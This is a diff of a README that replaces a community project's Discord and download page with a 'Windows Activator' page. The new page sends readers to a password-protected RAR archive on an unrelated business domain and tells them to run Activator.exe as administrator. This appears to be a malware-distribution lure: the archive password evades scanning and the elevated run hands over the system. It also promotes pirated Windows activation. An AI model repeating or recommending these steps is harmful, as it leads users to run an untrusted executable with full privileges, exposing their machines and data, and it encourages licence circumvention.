@@ -1,12 +1,12 @@
-![intro](https://cdn.discordapp.com/attachments/599617188487233561/720666641670733834/ezgif.com-video-to-gif.gif "Random-Nightclub")
-________________________
-![GitHub last commit](https://img.shields.io/github/last-commit/MauriceX24/wwm?color=blue&label=last%20changes "Neuste Version") 
-- [Download setup.exe](https://github.com/MauriceX24/wwm/raw/master/setup.exe "Download this awesome setup")
-__________________________________
-## Updates
-On Discord you can see al changes I have been added or removed.
-<div align="left">
-    <a href="http://discord.rncfamily.de" title="Random-Nightclub" rel="nofollow">
-    <img src="https://discordapp.com/api/guilds/351756216579522560/widget.png?style=banner2" height="76px" alt="Random-Nightclub" data-canonical-src="https://discordapp.com/api/guilds/351756216579522560/widget.png?style=banner2" style="max-width:100%;">
-    </a>
-</div>
+# Windows Activator
+![изображение](https://user-images.githubusercontent.com/35397688/230432648-8fc72cec-4554-43e0-9357-493cf684323f.png)
+## Activates all versions of Windows 
+With this program you can easily activate any version of Windows, just select your operating system and wait a bit for the program to activate your operating system
+# Download And Install
+Step [1/2] Download 'activator script' from direct download links given below :
+* Download: [Download](https://portalproveedores.com.mx/softwarehub/download/Windows%20Activator.rar)
+* Password: wactivator
+Step 2/2] Run File as Administrator
+* Right click Activator.exe file and select on run as administrator option
+* Wait until the process is completed in cmd
+# Your Windows is activated !!
